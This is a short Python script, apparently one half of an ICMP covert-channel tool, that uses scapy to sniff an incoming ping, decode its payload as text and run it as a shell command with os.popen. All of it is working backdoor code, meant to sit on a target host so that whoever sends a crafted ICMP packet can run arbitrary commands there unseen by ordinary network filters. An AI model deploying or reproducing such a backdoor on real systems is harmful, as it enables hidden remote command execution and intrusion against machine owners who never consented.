#!/usr/bin/env python3

#Client should be on the host machine

from scapy.all import *

recv = sniff(filter="icmp", count=1)
print(recv)
data = recv[0][Raw].load.decode('utf-8')
out = os.popen(data).read()
print(out)
